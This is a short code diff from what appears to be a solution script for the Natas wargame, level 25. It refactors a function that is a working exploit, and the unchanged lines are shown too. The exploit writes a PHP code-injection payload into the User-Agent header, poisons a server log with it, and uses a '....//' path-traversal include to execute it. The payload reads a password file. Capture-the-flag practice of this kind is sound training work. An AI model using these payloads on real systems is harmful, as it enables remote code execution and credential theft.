@@ -6,10 +6,11 @@ level_number = 25
 
 def get_secret():
     req = get_request_object(level_number)
+    url = get_level_url(level_number)
     script = "<?php echo 'natas26 Password: '; passthru('cat /etc/natas_webpass/natas26'); ?>"
-    result = req.get(get_level_url(level_number) + "/?lang=natas_webpass", headers={"User-Agent": script})
+    result = req.get(url + "/?lang=natas_webpass", headers={"User-Agent": script})
     cookie = result.cookies.get("PHPSESSID")
-    result = req.get(get_level_url(level_number) + f"/?lang=....//logs/natas25_{cookie}.log")
+    result = req.get(url + f"/?lang=....//logs/natas25_{cookie}.log")
     text = result.text
     search = "natas26 Password:"
 
